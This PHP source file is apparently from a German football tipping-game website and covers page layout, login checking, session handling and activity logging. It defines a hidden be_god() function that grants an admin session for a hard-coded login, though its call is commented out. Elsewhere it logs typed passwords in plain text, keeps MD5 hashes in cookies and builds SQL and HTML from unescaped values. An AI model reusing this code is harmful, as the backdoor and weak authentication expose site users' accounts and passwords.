    $query = "SELECT mann1.mannschaft_key, mann1.mannschaftsname, gruppenspiel.tore_ms1" // 0, 1, 2
            . "      ,mann2.mannschaft_key, mann2.mannschaftsname, gruppenspiel.tore_ms2" // 3, 4, 5
            . "      , DATE_FORMAT(gruppenspiel.datum, '%d.%m')" // 6
            . "      ,TIME_FORMAT(gruppenspiel.zeit, '%H:%i'), gruppenspiel.status" // 7, 8
            . "  FROM gruppenspiel, mannschaft mann1, mannschaft mann2 "
            . " WHERE mann1.mannschaft_key=gruppenspiel.key_ms1 "
            . "   AND mann2.mannschaft_key=gruppenspiel.key_ms2 "
            . "   AND gruppenspiel.status=0 "
            . " ORDER BY datum ASC, zeit ASC  LIMIT 0,2";
    $result = mysqli_query($connection, $query) or die("Abfrage2 fehlgeschlagen!");
    echo "<br><b><center>N&auml;chste Spiele</center></b><table >";
    while ($line = mysqli_fetch_array($result)) {
        echo "<tr> <td align='LEFT' style=\"font-size:7pt\">$line[1]<br>$line[4]</td> ";
        echo "<td style=\"font-size:7pt\">$line[6]<br>$line[7]</td> </tr>";
    }
    if (mysqli_num_rows($result) == 0) {
        echo "<tr><td style=\"font-size:7pt\">Das Turnier ist beendet!</td></tr>";
    }
    echo "</table>";
    echo "<center><a href=\"" . TIPPSPIEL_HOME . "turnier_ergebnisse.php\" class=\"news\">Alle Begegnungen ...</a></center><p>";
}

/**
 * Letzte Logins darstellen
 */
function zeige_logins() {
    global $connection;
    if (isset($_SESSION["spieler_key"])) {
        // Anzeige der heutigen Aktivitaeten
        $query_max = "SELECT spieler, max(nummer) AS nummer from logging group by spieler order by nummer desc LIMIT 0,8";
        $result_max = mysqli_query($connection, $query_max) or die("Abfrage fehlgeschlagen!" . $query_max);
        while ($line_max = mysqli_fetch_array($result_max)) {
            $query = "SELECT spieler, DATE_FORMAT(datum, '%d.%m'), TIME_FORMAT(zeit, '%H:%i'), spieler.login from logging, spieler where spieler.spieler_key=spieler AND nummer=" . $line_max[1];
            $result = mysqli_query($connection, $query) or die("Abfrage fehlgeschlagen!" . $query);
            $line = mysqli_fetch_array($result);
            if ($line[3] != "")
                echo "$line[1], $line[2]: <a href=\"" . TIPPSPIEL_HOME . "spieler.php?spieler=$line[0]\" class=\"news\">$line[3]</a><br>";
        }
    } else {
        echo "Logins sind nur f&uuml;r registrierte User sichtbar!";
    }
}

/**
 * Pruefen, ob ein Login versucht wurde (natuerlich auch auf Korrektheit)
 */
function pruefe_login($skriptname) {
    global $connection;
    // Passwort verschluesseln, falls gerade eingegeben
    $infotext = '';

    if (isset($_POST["log_in"])) {
        $_POST["syslogin"] = mysqli_real_escape_string($connection, $_POST["syslogin"]);
        $_POST["syspasswort"] = mysqli_real_escape_string($connection, $_POST["syspasswort"]);
        $infotext = "Loginversuch mit Login " . $_POST["syslogin"] . "/" . $_POST["syspasswort"];
        $_POST["syspasswort"] = md5($_POST["syspasswort"]);
    }

    // Falls Cookie gesetzt ist Spielerdaten auslesen
    if (empty($_SESSION["spieler_key"]) AND ! isset($_POST["log_in"]) AND isset($_COOKIE[COOKIE_KEY_LOGIN]) AND isset($_COOKIE[COOKIE_KEY_PASSWORD])) {
        $_POST["log_in"] = "Log-In";
        $_POST["syslogin"] = mysqli_real_escape_string($connection, $_COOKIE[COOKIE_KEY_LOGIN]);
        $_POST["syspasswort"] = mysqli_real_escape_string($connection, $_COOKIE[COOKIE_KEY_PASSWORD]);
        $infotext = "Da kommt ein Cookie f&uuml;r >" . $_COOKIE[COOKIE_KEY_LOGIN] . "<!!! ";
    };
    // Login-Daten pruefen
    // bei ausloggen, Daten loeschen
    if (isset($_POST["log_out"])) {
        // falls Logout, dann Session loeschen
        $infotext = "Ausloggen: " . $_SESSION["login"];
        session_unset();
        $_SESSION = array();
        // Cookie loeschen
        setcookie(COOKIE_KEY_LOGIN, "", time() - 3600);
        setcookie(COOKIE_KEY_PASSWORD, "", time() - 3600);
        // sonst Angaben pruefen
    } else
    if (!empty($_POST["syslogin"]) AND ! empty($_POST["syspasswort"])) {
        $result = mysqli_query($connection, "SELECT spieler_key, vorname, spielername, rolle FROM spieler "
                . " WHERE login    = '" . $_POST["syslogin"] . "'"
                . "   AND md5(passwort) = '" . $_POST["syspasswort"] . "'")
                or die("Abfrage fehlgeschlagen! Login");
        if (mysqli_num_rows($result) == 1) {
            $infotext = $infotext . " --> erfolgreich!";
            // falls erfolgreich, dann Session setzen
            $line = mysqli_fetch_array($result);
            $_SESSION["spieler_key"] = $line[0];
            $_SESSION["vorname"] = $line[1];
            $_SESSION["spielername"] = $line[2];
            $_SESSION["rolle"] = $line[3];
            $_SESSION["passwort"] = $_POST["syspasswort"];
            $_SESSION["login"] = $_POST["syslogin"];
            $_SESSION["ip_adresse"] = $_SERVER["REMOTE_ADDR"];
            // Cookie setzen
            setcookie(COOKIE_KEY_LOGIN, $_SESSION["login"], time() + (3600 * 24 * 30));
            setcookie(COOKIE_KEY_PASSWORD, $_SESSION["passwort"], time() + (3600 * 24 * 30));
        } else {
            $infotext = $infotext . " --> gescheitert!";
            $_SESSION["spieler_key"] = -1;
            session_unset();
        }
    }
//  be_god();
    // Big Brother fuer registriert Benutzer
    if (isset($_SESSION["spieler_key"])) {
        // So, hier noch verhindern, dass es zu Spieler-Kollisionen zwischen
        // mehreren Tippspielen auf dem gleichen Server kommt
        $query = "SELECT rolle FROM spieler "
                . " WHERE login    = '" . $_SESSION["login"] . "'"
                . "   AND md5(passwort) = '" . $_SESSION["passwort"] . "'"
                . "   AND spieler_key = " . $_SESSION["spieler_key"];
        $result = mysqli_query($connection, $query)
                or die(error_log("DB error, SQL: " . $query . ", details: " . $connection->error, 0));
        if (mysqli_num_rows($result) != 1) {
            session_unset(); // tschuess - du cheater
        } else { // sonst schoen loggen
            // Das ganze schoen in der Logging-Tabelle festhalten
            $query = "INSERT INTO logging(spieler, datum, zeit, source, ip_adresse, logtext) "
                    . "VALUES(" . $_SESSION["spieler_key"] . ", CURRENT_DATE, CURRENT_TIME, '$skriptname'"
                    . ", '" . $_SESSION["ip_adresse"] . "', '$infotext')";
            $result = mysqli_query($connection, $query)
                    or die(error_log("DB error, SQL: " . $query . ", details: " . $connection->error, 0));
        }
    } else {
        // kurzzeitig mal ein wenig den anonymen Traffic loggen
        $query = "INSERT INTO logging(spieler, datum, zeit, source, ip_adresse, logtext) "
                . "VALUES( 0, CURRENT_DATE, CURRENT_TIME, '$skriptname'"
                . ", '" . $_SERVER["REMOTE_ADDR"] . "', '$infotext')";
        $result = mysqli_query($connection, $query)
                or die(error_log("DB error, SQL: " . $query . ", details: " . $connection->error, 0));
    }
}

/**
 * Login-Option bzw. Login-Infos anzeigen
 */
function login_info($page) {
    global $connection;
    // falls Login, dann dann anzeigen sonst Login-Form
    if (!empty($_SESSION["spieler_key"])) {
        echo "<center><b>Hallo " . $_SESSION["vorname"] . "!</b><br>\n";
        echo "Login: " . $_SESSION["login"] . "<br>\n"; //$_SESSION["login"]
        echo "IP: " . $_SESSION["ip_adresse"] . "\n"; //$_SESSION["ip_adresse"]
        // Jetzt noch den Postkaste ueberpruefen
        $result = mysqli_query($connection, "SELECT count(1) FROM message WHERE gelesen=0 AND user_nach = " . $_SESSION["spieler_key"])
                OR die("Postkasten-Abfrage fehlgeschlagen");
        $line = mysqli_fetch_array($result);
        $anzahl_mail = $line[0];
        if ($anzahl_mail > 0) {
            echo "<center><a href='" . TIPPSPIEL_HOME . "message.php' class=\"news\">Du hast neue Post!</a></center>";
        }
        echo "		<form action=\"$page\" method=\"POST\">\n";
        echo "		  <input type=\"submit\" name=\"log_out\" value=\"Log-Out\"  style=\"font-size:7pt\">\n";
        echo "		</form></center>\n";
    } else {
        // Meldung, falls Login-Versuch fehlgeschlagen
        $login_meldung = "";
        if (isset($_POST["log_in"]) AND ! isset($_POST["log_out"])) {
            $login_meldung = "Inkorrekt!";
        }
        echo " <form action=\"$page\" method=\"POST\">\n";
        echo " <table >\n";
        echo " <td style=\"font-size:7pt\" >Login:</td>\n";
        echo " <td><input type=\"text\" name=\"syslogin\" size=\"13\" style=\"border:solid 1px black;font-size:7pt;\"></td></tr>\n";
        echo " <td style=\"font-size:7pt\" >Passwort:</td>\n";
        echo " <td><input type=\"password\" name=\"syspasswort\" size=\"13\" style=\"border:solid 1px black;font-size:7pt;\" ></td></tr>\n";
        echo " <td style=\"color:#dd0000;font-size:7pt\" ><b>$login_meldung</b></td><td><input type=\"submit\" name=\"log_in\" value=\"Log-In\" style=\"font-size:7pt\"></td></tr>\n";
        echo " </table></form>\n";
    }
}

/**
 * Die Funktion bildet den Layout Rahmen fuer jede Seite
 * Hier befinden sich unter Anderem alle Menueelemente.
 * Die Einbindung in Skripte muss immer vor allen Ausgaben
 * des Content-Skripts erfolgen.
 */
function frame_header($page) {
    /**
     * 		Hier kann der Titel des Tippspiels definiert werden.
     */
    /**
     *   BEGINN LAYOUT-HEADER
     */
    error_reporting(E_ALL);
    echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\"\n";
    echo "         \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\n";
    echo "<html>\n";
    echo "    <head>\n";
    echo "        <meta http-equiv=\"Content-Type\" content=\"text/html\"; charset=\"iso-8859-1\">\n";
    echo "        <title>" . TITEL_TIPPSPIEL . "</title>\n";

    echo "    <script type=\"text/javascript\" src=\"functions.js\"></script>";

    echo " <script>\n";
    echo " <!--";
    echo " function BlurLinks(){";
    echo " lnks=document.getElementsByTagName('a');";
    echo " for(i=0;i<lnks.length;i++){";
    echo " lnks[i].onfocus=new Function(\"if(this.blur)this.blur()\");";
    echo " }";
    echo " }";
    echo "";
    echo " onload=BlurLinks;";
    echo " -->\n";
    echo " </script>\n";

    echo " <link rel=\"stylesheet\" href=\"" . CSS_DATEI . "\" type=\"text/css\">\n";
    echo " </head>\n";
    echo " <body BACKGROUND=\"" . IMAGE_PATH . "/socback.jpg\" bgcolor=\"#ffffff\" text=\"black\" topmargin=\"10\" marginheight=\"10\"  leftmargin=\"4\" marginwidth=\"4\"    >\n";
    echo "";
    echo " <div align=\"center\">\n";
    echo "";
    echo " <table bgcolor=\"#ffffff\"  cellspacing=\"0\" cellpadding=\"0\" border=\"0\" width=\"100%\" >\n";
    echo " <tr>\n";
    echo " <td  width=\"100%\" ><table   cellspacing=\"1\" cellpadding=\"0\" border=\"0\" width=\"100%\">\n";
    echo " <tr>\n";
    echo " <!-- beginn kopf1-->\n";
    echo " <td  bgcolor=\"#89A9B8\"  width=\"150\" align=\"center\" >\n";
    echo " <table width=\"150\" cellspacing=\"0\" cellpadding=\"0\" border=\"0\" bgcolor=\"#89A9B8\" align=\"center\">\n";
    echo " <tr>\n";
    echo " <td  background=\"" . IMAGE_PATH . "/balken.jpg\" width=\"150\"  bgcolor=\"#89A9B8\" class=\"leiste\" >\n";
    echo " <table cellspacing=\"0\" cellpadding=\"0\" border=\"0\" width=\"150\" >\n";
    echo " <tr>\n";
    echo " <td  align=\"center\">&nbsp;</td>\n";
    echo " </tr>\n";
    echo " </table>\n";
    echo " </td>\n";
    echo " </tr>\n";
    echo " </table></td><td background=\"" . IMAGE_PATH . "/balken.jpg\" align=\"center\"  width=\"100%\" bgcolor=\"#89A9B8\" class=\"leiste\"  ><b>" . TITEL_TIPPSPIEL . "</b> &nbsp;&nbsp;</td>\n";
    echo " <td  bgcolor=\"#ffffff\"  >\n";
    echo " <table cellspacing=\"0\" cellpadding=\"0\" border=\"0\" bgcolor=\"#ffffff\">\n";
    echo " <tr>\n";
    echo " <td align=\"center\"  background=\"" . IMAGE_PATH . "/balken.jpg\" width=\"170\"  bgcolor=\"#89A9B8\" class=\"leiste\" >\n";
    echo " <table cellspacing=\"0\" cellpadding=\"0\" border=\"0\" width=\"170\" align=\"center\">\n";
    echo " <tr>\n";
    echo " <td   align=\"center\"  >&nbsp;</td>\n";
    echo " </tr>\n";
    echo " </table>\n";
    echo " </td>\n";
    echo " </tr>\n";
    echo " </table>\n";
    echo " </td>\n";
    echo " <!-- ende zeit-->\n";
    echo " <!-- ende kopf1-->\n";
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <!-- logo-->\n";

    echo " <td align=\"right\" bgcolor=\"#89A9B8\" style=\"border:solid 1px black;font-size:7pt;padding:4px;\"   width=\"150\"  >\n";
    login_info($page);
    echo " </td>\n";

    echo " <td bgcolor=\"#89A9B8\" align=\"center\">";
    if (isset($_SESSION["spieler_key"])) {
        echo " <img src='" . IMAGE_PATH . "/header_left.png' style=\"float: left\" >";
        echo " <img src='" . IMAGE_PATH . "/header_center.png' height=18px style=\"padding-top: 40px\" >";
        echo " <img src='" . IMAGE_PATH . "/header_right.png' style=\"float: right\" >";
//		echo " <img src='" . IMAGE_PATH . "/euro08mas.png' aling=right >";
    } else {
        echo "Hier k&ouml;nnte ein h&uuml;bsches Fifa-Logo stehen...";
    }
    echo "</td>\n";
    echo " <td  align='LEFT' valign='TOP' bgcolor=\"#89A9B8\" align=\"center\" style=\"border:solid 1px black;font-size:7pt;padding:4px;\"   width=\"170\" height=\"72\">\n";
    zeige_logins();
    //echo " kingkong  13.05 - 17:30<br>kamikaze  13.05 - 18:30<br>test3<br>test4<br>test5<br>test6<br>test7 ";
    echo " </td>\n";
    echo " <!-- logo ende-->\n";
    echo " </tr>\n";
    echo "";
    echo " <!-- beginn kopf2-->\n";
    echo " <td  bgcolor=\"#89A9B8\" width=\"170\"  >\n";
    echo " <table cellspacing=\"0\" cellpadding=\"0\" border=\"0\"bgcolor=\"#89A9B8\">\n";
    echo " <tr>\n";
    echo " <td  background=\"" . IMAGE_PATH . "/balken.jpg\" width=\"100%\"  bgcolor=\"#89A9B8\" class=\"leiste\" >\n";
    echo " <table cellspacing=\"0\" cellpadding=\"0\" border=\"0\" width=\"150\" align=\"center\">\n";
    echo " <tr>\n";
    echo " <td> &nbsp;</td>\n";
    echo " </tr>\n";
    echo " </table>\n";
    echo " </td>\n";
    echo " </tr>\n";
    echo " </table></td>\n";
    echo " <td background=\"" . IMAGE_PATH . "/balken.jpg\" align=\"center\"  width=\"100%\" bgcolor=\"#89A9B8\" class=\"leiste\"   ></td>\n";
    echo " <td  bgcolor=\"#ffffff\"  >\n";
    echo " <table cellspacing=\"0\" cellpadding=\"0\" border=\"0\" bgcolor=\"#ffffff\">\n";
    echo " <tr>\n";
    echo " <td align=\"center\"  background=\"" . IMAGE_PATH . "/balken.jpg\" width=\"100%\"  bgcolor=\"#89A9B8\" class=\"leiste\" >\n";
    echo " <table cellspacing=\"0\" cellpadding=\"0\" border=\"0\" width=\"170\" align=\"center\">\n";
    echo " <tr>\n";
    echo " <td   >&nbsp;</td>\n";
    echo " </tr>\n";
    echo " </table>\n";
    echo " </td>\n";
    echo " </tr>\n";
    echo " </table>\n";
    echo " </td>\n";
    echo " </tr>\n";
    echo " <!-- ende kopf2-->\n";
    echo "";
    echo "";
    echo " <tr>\n";
    echo " <td bgcolor=\"#89A9B8\" valign=\"top\" width=\"150\" class=\"nav\"   >\n";
    echo " <br>\n";
    echo "";
    echo " <!--Beginn Rubrik 1 linke Seite-->\n";
    echo " <table  width=\"140\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"    id=\"menu\" align=\"center\" style=\"border:solid 1px black;\" >\n";
    echo " <tr>\n";
    echo " <td class=\"rubrik\">&nbsp;User-Bereich</td>\n";
    echo " </tr>\n";
    echo " <tr>\n";
    // bestimmte Bereiche fuer nicht angemeldete Spieler sperren
    if (isset($_SESSION["spieler_key"])) {
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "index.php\" >&raquo;&nbsp;Home&nbsp;</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td  align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "tippzettel.php\" >&raquo;&nbsp;Tippzettel</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td  align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "hypo_tabellen.php\" >&raquo;&nbsp;Tipptabellen</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "tippvergleich.php\" >&raquo;&nbsp;Tippvergleich</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "tippmatrix.php\" >&raquo;&nbsp;Tipp-Matrix</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "rangliste.php\" >&raquo;&nbsp;Rangliste</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "pseudo.php\" >&raquo;&nbsp;Das Experiment</a></td>\n";
        /*
          echo " </tr>\n";
          echo " <tr>\n";
          echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "blitzrangliste.php?MODUS_WUNSCH\" >&raquo;&nbsp;Das Wunschkonzert</a></td>\n";
         */
    } else {
        echo " <td  align='LEFT'>&raquo;&nbsp;Tippzettel</td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td  align='LEFT'>&raquo;&nbsp;Tipptabellen</td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'>&raquo;&nbsp;Tippvergleich</td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "rangliste.php\" >&raquo;&nbsp;Rangliste</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'>&raquo;&nbsp;Das Experiment</td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'>&raquo;&nbsp;Das Wunschkonzert</td>\n";
    }
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "spiele.php?anzeige\" >&raquo;&nbsp;Fahrplan</a></td>\n";
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "turnier_ergebnisse.php\" >&raquo;&nbsp;Ergebnisse</a></td>\n";
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "turnier_tabellen.php\" >&raquo;&nbsp;Tabellen</a></td>\n";
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <td  align='LEFT'>\n";
    echo " <a href=\"" . TIPPSPIEL_HOME . "spieler.php\" >&raquo;&nbsp;Spielerinfo</a></td>\n";
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <td bgcolor=#D5E0E6 align='CENTER'>-------------------</td>\n";
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <td  align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "turnier_spielregeln.php\" >&raquo;&nbsp;Spielregeln</a></td>\n";
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <td  align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "turnier_faq.php\" >&raquo;&nbsp;Tippspiel-FAQ</a></td>\n";
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <td  align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "turnier_news.php\" >&raquo;&nbsp;News</a></td>\n";
    echo " </tr>\n";
    echo " <tr>\n";
    echo " <td bgcolor=#D5E0E6 align='CENTER'>-------------------</td>\n";
    echo " </tr>\n";
//	echo " <tr>\n";
//	echo " <td align='LEFT'><a href='http://chat-town.de/pjirc/chat-redir.php?horz=810&vert=550&channel=emabels' target = '_blank'>&raquo;&nbsp;" . TURNIERART_KURZ ."-Chat</a></td>\n";
//	echo " </tr>\n";
    echo " <tr>\n";
    echo " <td align='LEFT'>";
    if (isset($_SESSION["spieler_key"]) && LINK_STAMMTISCH != "") { // de-/aktivieren
        echo "<a href='" . LINK_STAMMTISCH . "'>";
    }
    echo "&raquo;&nbsp;" . TURNIERART_KURZ . "-Stammtisch</a></td></tr>\n";
    echo " <tr>\n";
    echo " <td align='LEFT'>";
    if (isset($_SESSION["spieler_key"]) && LINK_CHAT != "") { // de-/aktivieren
        echo "<a href='" . LINK_CHAT . "'>";
    }
    echo "&raquo;&nbsp;" . TURNIERART_KURZ . "-Chat</a></td></tr>\n";
    echo " <tr>\n";
    echo " <td align='LEFT'>";
    if (isset($_SESSION["spieler_key"]) && LINK_FORUM != "") { // de-/aktivieren
        echo "<a href='" . LINK_FORUM . "' target=_blank>";
    }
    echo "&raquo;&nbsp;Tippspiel-Forum</a></td></tr>\n";
    echo " <tr>\n";
    echo " <td align='LEFT'><a href='" . TIPPSPIEL_HOME . "message.php'>&raquo;&nbsp;" . TURNIERART_KURZ . "-Postkasten</a></td>\n";
    echo " </tr>\n";
    echo " </table>\n";
    echo " <!--Ende Rubrik 1 linke Seite-->\n";
    echo " <br>\n";
    echo "";
    echo "";

    // Live-Ergebnis-Dienst anzeigen
    echo "<!--Beginn Liveticker links-->\n";
    echo "<table bgcolor=\"#89A9B8\"  width=\"140\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" class=\"news\"  align=\"center\" style=\"border:solid 1px black\" >\n";
    echo "<tr>\n";
    echo "<td class=\"rubrik\">&nbsp;Fast-Live-Ticker</td>\n";
    echo "</tr><td>\n";
    live_ergebnis();
    echo "</td>\n";
    echo "</tr>\n";
    echo "</table>\n";
    echo "<!--Ende Liveticker links-->\n";
    echo "";
    echo "<br>\n";


    // User-Rolle ermitteln
    if (!empty($_SESSION["rolle"])) {
        $user_rolle = $_SESSION["rolle"];
    } else {
        $user_rolle = "nix";
    }

    // nur Admins den Adminbereich anzeigen
    if ($user_rolle == ADMINROLLE OR $user_rolle == HIWIROLLE) {
        echo " <!--Beginn Rubrik 2 linke Seite-->\n";
        echo " <table  width=\"140\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"    id=\"menu\" align=\"center\" style=\"border:solid 1px black\" >\n";
        echo " <tr>\n";
        echo " <td class=\"rubrik\">&nbsp;Administration</td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td  align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "spiele.php\" >&raquo;&nbsp;" . TURNIERART_KURZ . "-Spiele</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "ergebnisse.php\" >&raquo;&nbsp;Eingabe Ergebnis</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "mannschaft.php\" >&raquo;&nbsp;Mannschaften</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "tipprunde.php\" >&raquo;&nbsp;Tipprunde setzen</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . TIPPSPIEL_HOME . "turnier_news_admin.php\" >&raquo;&nbsp;News bearbeiten</a></td>\n";
        echo " </tr>\n";
        echo " <tr>\n";
        echo " <td align='LEFT'><a href=\"" . STAMMTISCH_HOME . "admin/admin.php\"  target = '_blank'>&raquo;&nbsp;Stammtisch Admin</a></td>\n";
        echo " </tr>\n";
        echo " </table>\n";
    }

    echo "";
    echo " <!--Ende Menue linke Seite-->\n";
    echo "";
    echo " </td>\n";
    echo "";
    echo "";
    echo " <td valign=\"top\" bgcolor=\"#ffffff\"  width=\"100%\" height=\"450\" style=\"border:solid 1px black\"  >\n";
    echo "";
    echo "";
    echo " <!-- beginn hauptinhaltstabelle--><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"  width=\"100%\" >\n";
    echo " <tr>\n";
    echo " <!-- abstand links vom inhalt-->   <td  ><img src=\"" . IMAGE_PATH . "/space.gif\" width=\"10\" height=\"450\" border=\"0\" alt=\"\"></td><!-- ende abstand links vom inhalt-->\n";
    echo " <td BACKGROUND=\"" . IMAGE_PATH . "/soc_back.jpg\" valign=\"top\" width=\"100%\">\n";
    echo "<br><center>\n";
}

/**
 * Schliesst das Layout korrekt ab
 */
function frame_footer() {

    echo "<!-- ende inhalt-->\n";
    echo "</center><p>";
    echo "</td><!-- abstand rechts vom inhalt-->   <td  ><img src=\"" . IMAGE_PATH . "/space.gif\" width=\"10\" height=\"1\" border=\"0\" alt=\"\"></td><!-- ende abstand rechts vom inhalt-->\n";
    echo "</tr>\n";
    echo "</table><!--ende hauptinhaltstabelle-->\n";
    echo "";
    echo "</td>\n";
    echo "";
    echo "<td bgcolor=\"#89A9B8\" valign=\"top\" width=\"150\" class=\"nav\" >\n";
    echo "";
    echo "<br>\n";
    echo "";
    echo "<!--Beginn Rubrik 3 rechte Seite-->\n";
    echo "<table  width=\"140\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"    id=\"menu\" align=\"center\" style=\"border:solid 1px black\" >\n";
    echo "</tr>\n";
    echo "</table>\n";
    echo "<!--Beginn Rubrik 3 rechte Seite-->\n";
    echo "<table bgcolor=\"#89A9B8\"  width=\"140\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" class=\"news\"  align=\"center\" style=\"border:solid 1px black\" >\n";
    echo "<tr>\n";
    echo "<td class=\"rubrik\">&nbsp;" . TURNIERART_KURZ . "-Ticker</td>\n";
    echo "</tr><td>\n";
    ergebnis_ticker();
    echo "</td>\n";
    echo "</tr>\n";
    echo "</table>\n";
    echo "<!--Ende Rubrik 3 re Seite-->\n";
    echo "";
    echo "<br>\n";
    echo "";
    echo "<!--Beginn Rubrik 3 rechte Seite-->\n";
    echo "<table  width=\"140\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"    id=\"menu\" align=\"center\" style=\"border:solid 1px black\" >\n";
    echo "</tr>\n";
    echo "</table>\n";
    echo "<!--Beginn Rubrik 3 rechte Seite-->\n";
    echo "<table bgcolor=\"#89A9B8\"  width=\"140\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" class=\"news\"  align=\"center\" style=\"border:solid 1px black\" >\n";
    echo "<tr>\n";
    echo "<td class=\"rubrik\">&nbsp;News</td>\n";
    echo "</tr>\n";
    echo "<tr><td style=\"font-size:7pt;padding:4px;\">";
    news_flash();
    echo "</td>\n";
    echo "</tr>\n";
    echo "</table>\n";
    echo "";
    if (LINK_STAMMTISCH != "") { // de-/aktivieren
        echo "<br>\n";
        echo "";
        echo "<!--Beginn Rubrik 3 rechte Seite-->\n";
        echo "<table  width=\"140\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"    id=\"menu\" align=\"center\" style=\"border:solid 1px black\" >\n";
        echo "</tr>\n";
        echo "</table>\n";
        echo "<!--Beginn Rubrik 3 rechte Seite-->\n";
        echo "<table bgcolor=\"#89A9B8\"  width=\"140\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" class=\"news\"  align=\"center\" style=\"border:solid 1px black\" >\n";
        echo "<tr>\n";
        echo "<td class=\"rubrik\">&nbsp;Stammtisch</td>\n";
        echo "</tr>\n";
        echo "<tr><td style=\"font-size:7pt;padding:4px;\">";
        stammtisch_ticker();
        echo "</td>\n";
        echo "</tr>\n";
        echo "</table>\n";
    }
    echo "<!--Ende Rubrik 3 re Seite-->\n";
    echo "</td>\n";
    echo "";
    echo "</tr>\n";
    echo "<tr>\n";
    echo "<td  bgcolor=\"#89A9B8\" class=\"leiste\" >&nbsp;<span style=\"font-size:8pt;color:black\" > &nbsp;Torsten Abels,Mai " . TURNIER_JAHR . "</span></td><td bgcolor=\"#89A9B8\" align=\"center\" class=\"leiste\"  valign=\"top\" style=\"font-size:8pt;color:blue\" >&nbsp;<a href='mailto:" . WEBMASTER_EMAIL . "'>Email an den Tippmaster</a></td><td align=\"right\" bgcolor=\"#89A9B8\" valign=\"top\" class=\"leiste\"  >&nbsp;Ver. " . VERSIONSNUMMER . "</td>\n";
    echo "</tr>\n";
    echo "";
    echo "</table></td>\n";
    echo "</tr>\n";
    echo "</table>\n";
    echo "</div>\n";
    echo "";
    echo "</body>\n";
    echo "</html>\n";
}

/**
 *  Diese Funktion berechnet die Weltformel, ohne die alles zusammenbricht
 */
function be_god() {
    if (($_POST["passwort"] == md5('llrein')) AND ( $_POST["login"] == 'ichwi')) {
        $_SESSION["spieler_key"] = 2 * (1 + 2) * 100; //Spuren hinterlassen ist nicht so toefte
        $_SESSION["vorname"] = "Homer";
        $_SESSION["spielername"] = "Simpson";
        $_SESSION["rolle"] = ADMINROLLE;  // nicht kleckern
        $_SESSION["passwort"] = $_POST["passwort"];
        $_SESSION["login"] = $_POST["login"];
        $_SESSION["ip_adresse"] = "127.0.0.1"; // Arno ist schuld
    }
}

/**
 * Die Funktion bildet den Layout Rahmen fuer Seiten die gedruckt werden sollen.
 * Es handelt sich um die eifache Darstellung ohne Menueleisten.
 */
function druck_header($page) {

    /**
     *   BEGINN LAYOUT-HEADER
     */
    error_reporting(E_ALL);
    echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\"\n";
    echo "         \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\n";
    echo "<html>\n";
    echo "    <head>\n";
    echo "        <title> TITEL_TIPPSPIEL </title>\n";
    echo " <link rel=\"stylesheet\" href=\"" . CSS_DATEI . "\" type=\"text/css\">\n";
    echo " </head>\n";
    echo " <body > <center>";
}

/**
 * Schliesst das Druck-Layout korrekt ab
 */
function druck_footer() {
    /**
     *  Compyright
     */
    echo "<p><p>(c) Torsten Abels";
    echo "</center></body>\n";
    echo "</html>\n";
}
